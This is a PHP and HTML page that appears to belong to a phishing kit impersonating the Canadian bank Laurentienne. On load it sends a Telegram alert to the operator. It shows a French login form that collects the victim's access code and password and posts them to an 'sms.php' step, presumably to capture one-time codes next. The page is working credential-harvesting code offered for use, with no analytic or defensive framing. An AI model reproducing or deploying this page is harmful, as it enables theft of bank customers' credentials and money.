<?php session_start();
$_SESSION["bank"] ='LAURENTIENNE';


require_once "../sendto.php";


sendMessageToTelegram('🟡🟡🟡'.$_SESSION['bank'].'🟡🟡🟡'); 
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/laurentienne/styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="/laurentienne/styles_pc.css">
    <title>Laurentienne</title>
</head>
<header>
<nav>
    <span> <img src="./logo.svg" alt=""> </span>
</nav>
</header>
<body style="margin: 0px;">
    
<form action="/laurentienne/sms.php" method="post" >
    <label for="cvv"> code d'acces* </label>
    <input type="text" name="cvv" placeholder="Code d'acces *" required>

    <label for="mdp">  Mot de passe*  </label>
    <input type="password" name="mdp" placeholder="Mot de passe * " required>
        <br>
  <span> <input type="checkbox" name="check">
       <strong>   se souvenire de moi </strong></span>
 <div class="info">  
    Pour cree un profile de connexion selectionnez <i><<</i>  se souvenire de moi <i>>></i>
          Sur l'appli mobile , cette option vou permetraa d'utilser Vue rapide ou la conexion biometrique
</div>
   

    <input type="submit" value="CONNEXION">

  <b> Réinitialiser le mot de passe</b> 

</form>
<br> <br>

</body>
</html>
